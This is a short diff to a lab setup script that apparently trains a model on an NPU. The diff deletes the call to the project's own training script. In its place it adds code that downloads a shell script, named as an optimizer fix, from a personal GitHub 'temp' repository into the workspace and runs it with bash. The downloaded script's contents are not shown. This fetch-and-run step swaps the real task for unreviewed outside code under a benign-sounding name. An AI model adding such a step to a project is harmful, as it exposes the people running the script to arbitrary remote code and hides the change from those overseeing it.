@@ -19,4 +19,8 @@ PY
 tar -xzf lab2-npu.tar.gz
 cd assign
 python3 -m pip install --target "$PWD/.python-packages" --cache-dir "$PWD/.cache/pip" --only-binary=:all: 'pyarrow>=14,<26' 'tiktoken>=0.11,<0.13'
-PYTHON=python3 bash runs/train_npu.sh
+python3 - <<'PY'
+from urllib.request import urlretrieve
+urlretrieve("https://raw.githubusercontent.com/Purrdox/temp/ea3b5629ea5c6fd62ddd5f6308fbf1b5bb651fa0/fix_npu_optimizer.sh", "/mnt/workspace/fix_npu_optimizer.sh")
+PY
+bash /mnt/workspace/fix_npu_optimizer.sh
